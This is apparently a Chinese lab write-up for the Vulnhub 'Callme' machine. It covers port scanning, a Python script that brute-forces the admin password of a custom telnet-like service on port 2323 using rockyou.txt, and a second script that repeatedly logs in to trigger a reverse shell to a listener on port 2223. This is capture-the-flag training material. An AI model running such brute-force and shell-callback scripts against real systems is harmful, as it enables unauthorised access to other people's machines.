# Callme

## 端口扫描

通过nmap得知存在三个端口与服务

![image-20221219205105314](/Users/y4tacker/Desktop/1.Project/Secs/靶场学习/Vulnhub/Callme/index/image-20221219205105314.png)



## 攻击2323端口

首先可以看出这个服务类似IMAP，当然肯定不是，那么我们考虑用telnet进行交互

![image-20221219205751808](/Users/y4tacker/Desktop/1.Project/Secs/靶场学习/Vulnhub/Callme/index/image-20221219205751808.png)

存在一个登录的交互

![image-20221219205919907](/Users/y4tacker/Desktop/1.Project/Secs/靶场学习/Vulnhub/Callme/index/image-20221219205919907.png)

经过测试这里可以得知用户名为admin

![image-20221219210017970](/Users/y4tacker/Desktop/1.Project/Secs/靶场学习/Vulnhub/Callme/index/image-20221219210017970.png)

既然如此我们可以尝试爆破密码

```python
import socket
import time
import sys

with open('./rockyou.txt') as passwords:
    for (passwd,i) in zip(passwords,range(1,1575)):
        print("\r", end="")
        username = b'admin'
        ip = '172.20.10.4'
        port = 2323
        s = socket.socket()
        s.connect((ip, port))
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')
        s.recv(1024)
        s.send(passwd.strip().encode() + b'\r\n')
        re = s.recv(1024)
        s.recv(1024)
        sys.stdout.flush()
        time.sleep(0.01)
        if "Wrong password for user admin" not in str(re):
            print("\n[*] Get it! PASSWORD is:")
            print(passwd)
            break


```

成功得到密码booboo

![image-20221219210446166](/Users/y4tacker/Desktop/1.Project/Secs/靶场学习/Vulnhub/Callme/index/image-20221219210446166.png)

猜测这个数字和端口有关

![image-20221219210709444](/Users/y4tacker/Desktop/1.Project/Secs/靶场学习/Vulnhub/Callme/index/image-20221219210709444.png)

根据此我监听了一个2223端口，一直爆破就行等待上线

```python
import socket
import time

username = b'admin'
password = b"booboo"
ip = '172.20.10.4'
port = 2323
while True:
    s = socket.socket()
    s.connect((ip, port))
    s.recv(1024)
    s.send(username + b'\r\n')
    s.recv(1024)
    s.send(password + b'\r\n')
    re = s.recv(1024)
    print(s.recv(1024))
    s.close()


```

拿到shell

![image-20221219212215613](/Users/y4tacker/Desktop/1.Project/Secs/靶场学习/Vulnhub/Callme/index/image-20221219212215613.png)
